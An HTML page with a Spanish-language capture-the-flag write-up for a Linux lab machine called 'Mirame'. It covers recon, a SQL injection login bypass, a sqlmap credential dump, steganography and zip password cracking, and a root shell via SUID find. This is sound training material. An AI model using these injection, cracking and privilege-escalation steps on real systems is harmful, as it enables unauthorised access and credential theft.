<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Write‚Äëup: Mirame</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
    <script>hljs.highlightAll();</script>
</head>

<body class="bg-gray-900 text-white">
    <!-- NAVBAR -->
    <nav class="bg-gray-800 text-white sticky top-0 z-50 shadow-md">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div class="flex justify-between items-center h-16">
            <div class="flex-shrink-0">
            <h1 class="font-semibold">Santiago Lorenzo</h1>
            </div>
            <div class="hidden md:flex space-x-4">
                <a href="../index.html#inicio" class="hover:text-blue-400 transition">Inicio</a>
                <a href="../index.html#certificados" class="hover:text-blue-400 transition">Certificaciones</a>
                <a href="../index.html#proyectos" class="hover:text-blue-400 transition">Proyectos</a>
                <a href="../writeup.html" class="hover:text-blue-400 transition">Write‚Äëups</a>
            </div>
        </div>
        </div>
    </nav>

    <main class="max-w-4xl mx-auto px-6 py-12">
        <h1 class="text-4xl font-bold mb-2">‚ùÑÔ∏è M√°quina: Mirame</h1>
        <p class="text-gray-400 text-sm mb-8">üìÖ Publicado el 11/09/2025 | Categor√≠a: LINUX </p>

        <!-- DESCRIPCI√ìN -->
        <section class="mb-10">
        <h2 class="text-2xl font-semibold mb-2">üìù Descripci√≥n</h2>
        <p class="text-gray-300 leading-relaxed">
            Reto en el cual tendremos que hacer un aqlinjecion en un login, decifrar que contiene una imagen, extraer el archivo que contenia,
            descifrar la contrase√±a para mostrar su contenido y finalizar con una 
            escalada de privilegios a <code>root</code>.
        </p>
        </section>

        <!-- RECON -->
        <section class="mb-10">
        <h2 class="text-2xl font-semibold mb-2">üîç Reconocimiento</h2>
        <pre><code class="language-bash">
            sudo nmap -p- -open -O -sS -sCV -min-rate 5000 -n -Pn 172.17.0.2

            PORT   STATE SERVICE VERSION
            22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
            | ssh-hostkey: 
            |   256 2c:ea:4a:d7:b4:c3:d4:e2:65:29:6c:12:c4:58:c9:49 (ECDSA)
            |_  256 a7:a4:a4:2e:3b:c6:0a:e4:ec:bd:46:84:68:02:5d:30 (ED25519)
            80/tcp open  http    Apache httpd 2.4.61 ((Debian))
            |_http-title: Login Page
            |_http-server-header: Apache/2.4.61 (Debian)

            </code></pre>
        </section> 

        <!-- WEB ENUM -->
        <section class="mb-10">
            <h2 class="text-2xl font-semibold mb-2">üåê Enumeraci√≥n Web</h2>
            <pre><code class="language-bash">gobuster dir -u http://172.17.0.2/ 
                -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50

                /page.php             (Status: 200) [Size: 2169]
                /index.php            (Status: 200) [Size: 2351]
                /auth.php             (Status: 200) [Size: 1852]
            </code></pre>
            
            <p class="text-gray-300">El directorio <code>/auth.php</code> nos importa.</p>
        </section>
        <img src="../Assets/mirame/1-auth.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="inicio">
        <p class="text-gray-300">Ingresando ' OR 1=1 -- ' vemos que si podremos realizar el SQLinjecion </p>

        <section class="mb-10">
            <p class="text-gray-300">Con bursuit podemos capturar la peticion para poder usarla con sqlmap</p>
            <img src="../Assets/mirame/2-peticion-capturada.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="inicio">
            <p class="text-gray-300">Eata petici√≥n la guarde en log.txt</p>

            <pre><code class="language-bash">
            sqlmap -r log.txt --batch --random-agent --dbs 

                available databases [2]:
                [*] information_schema
                [*] users

            sqlmap -r log.txt --batch --random-agent -D users --tables     

                Database: users
                [1 table]
                +----------+
                | usuarios |
                +----------+

            ‚ùØ sqlmap -r log.txt --batch --random-agent -D users -T usuarios --columns

                Database: users
                Table: usuarios
                [3 columns]
                +----------+--------------+
                | Column   | Type         |
                +----------+--------------+
                | id       | int(11)      |
                | password | varchar(255) |
                | username | varchar(50)  |
                +----------+--------------+


            sqlmap -r log.txt --batch --random-agent -D users -T usuarios -C password,username --dump 

                Database: users
                Table: usuarios
                [4 entries]
                +------------------------+------------+
                | password               | username   |
                +------------------------+------------+
                | chocolateadministrador | admin      |
                | directoriotravieso     | directorio |
                | lucas                  | lucas      |
                | soyagustin123          | agustin    |
                +------------------------+------------+

            </code></pre>

            <p class="text-gray-300">Nos dirigimos a directoriotravieso y encontramos:</p>

            <img src="../Assets/mirame/3-directoriotravieso.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="inicio">

            
            <p class="text-gray-300">nos descargamos dicho archivo y lo investigamos.
                revisamos los metadatos con exiftool y no muestran nada
                oculto aparte de la informaci√≥n b√°sica del archivo, entonces usamos una herramienta de esteganograf√≠a.
            </p>

            <pre><code class="language-bash">
            steghide extract -sf miramebien.jpg

            Enter passphrase: 
            steghide: could not extract any data with that passphrase!
            ‚ùØ stegseek miramebien.jpg /usr/share/wordlists/rockyou.txt

            [i] Found passphrase: "chocolate"
            [i] Original filename: "ocultito.zip".
            [i] Extracting to "miramebien.jpg.out".

            ‚ùØ steghide extract -sf miramebien.jpg

            Enter passphrase: 
            wrote extracted data to "ocultito.zip".

            ‚ùØ unzip ocultito.zip
            Archive:  ocultito.zip
            [ocultito.zip] secret.txt password: 
            </code></pre>
            <p class="text-gray-300">
                Nos damos cuenta que tiene un archivo pero este becesita contrase√±a,
                la desciframos y ahora el archivo ocultito.zip tambien necesita contrase√±a
                y la encontramos con Johntheripper
            </p>
            <pre><code class="language-bash">
            zip2john ocultito.zip > hash.txt

            john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
                Using default input encoding: UTF-8
                Loaded 1 password hash (PKZIP [32/64])
                Will run 2 OpenMP threads
                Press 'q' or Ctrl-C to abort, almost any other key for status
                stupid1          (ocultito.zip/secret.txt)     
                1g 0:00:00:00 DONE (2025-09-10 21:59) 10.00g/s 40960p/s 40960c/s 40960C/s 123456..oooooo
                Use the "--show" option to display all of the cracked passwords reliably
                Session completed. 

            john --show hash.txt
                ocultito.zip/secret.txt:stupid1:secret.txt:ocultito.zip::ocultito.zip

            </code></pre>
            <p class="text-gray-300">Ya con la contrase√±a lo descomprimimos y el archivo secret.txt contiene:
            </p>
            <pre><code class="language-bash">
            cat secret.txt
                carlos:carlitos
            </code></pre>
            <p class="text-gray-300">
                Con esto entramos al ssh
            </p>
        </section>

        <!-- ROOT -->
        <section class="mb-10">
        <h2 class="text-2xl font-semibold mb-2">üëë Escalada a root</h2>
        <p class="text-gray-300">Miramos los premisos SUID</p>


        <pre><code class="language-bash">
        www-data@812b6b56379f:/$ find / \-perm -4000 2>/dev/null

            /usr/lib/dbus-1.0/dbus-daemon-launch-helper
            /usr/lib/mysql/plugin/auth_pam_tool_dir/auth_pam_tool
            /usr/lib/openssh/ssh-keysign
            /usr/bin/gpasswd
            /usr/bin/su
            /usr/bin/umount
            /usr/bin/chfn
            /usr/bin/newgrp
            /usr/bin/passwd
            /usr/bin/find
            /usr/bin/mount
            /usr/bin/chsh
            /usr/bin/sudo
        </code></pre>

        <p class="text-gray-300">
            El binario find con SUID se puede abusar f√°cilmente para obtener una shell como root
        </p>

        <pre><code class="language-bash">
            carlos@7c89ee9d45d8:~$ /usr/bin/find . -exec /bin/sh -p \; -quit
        </code></pre>
        <p class="text-gray-300">
            Entonces:
        </p>
        <pre><code class="language-bash">
        # whoami
        root
        </code></pre>
        </section>

        <!-- RESULTADO -->
        <section class="mb-12">
        <h2 class="text-2xl font-semibold mb-2">üèÅ Resultado</h2>
        <p class="text-gray-300">Acceso total a la m√°quina con privilegios de <code>root</code></p>
        </section>

        <div class="mt-10">
        <a href="../writeup.html" class="inline-block bg-blue-500 px-6 py-2 rounded-lg text-white hover:bg-blue-700 transition">
            ‚Üê Volver a la lista de Write‚Äëups
        </a>
        </div>
    </main>
    </body>
</html>
